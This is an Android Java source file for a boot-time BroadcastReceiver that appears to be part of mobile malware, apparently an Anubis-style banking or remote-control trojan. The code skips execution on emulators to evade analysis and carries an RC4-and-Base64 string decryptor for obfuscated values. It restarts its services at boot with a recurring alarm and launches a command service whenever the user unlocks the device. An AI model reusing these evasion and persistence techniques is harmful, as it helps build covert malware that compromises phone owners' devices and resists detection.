package myapp.stuff.example.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;

import myapp.stuff.example.API.ClassRC4;
import myapp.stuff.example.ServiceCommands;
import myapp.stuff.example.StartWhileGlobal;
import myapp.stuff.example.UtilsClass;

public class ReceiverBoot extends BroadcastReceiver {
    UtilsClass SF = new UtilsClass();

    public ReceiverBoot() {}

    @Override
    public void onReceive(Context context, Intent intent) {
        if(SF.isEmulator())return;
        StartReceive(context, intent);
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    void StartReceive(Context context, Intent intent){
        String action = intent.getAction();
        context.startService(new Intent(context, StartWhileGlobal.class));

        SF.Log("Action","BOOT Start "+action);
        try{
            SF.startCustomTimer(context, "startAlarm", Integer.parseInt(SF.SetRead(context,"Interval")));
        }catch (Exception ex){
            SF.startCustomTimer(context, "startAlarm", 15000);

        }

        if(action.equals("android.intent.action.USER_PRESENT")){
            context.startService(new Intent(context, ServiceCommands.class));
        }
    }
}
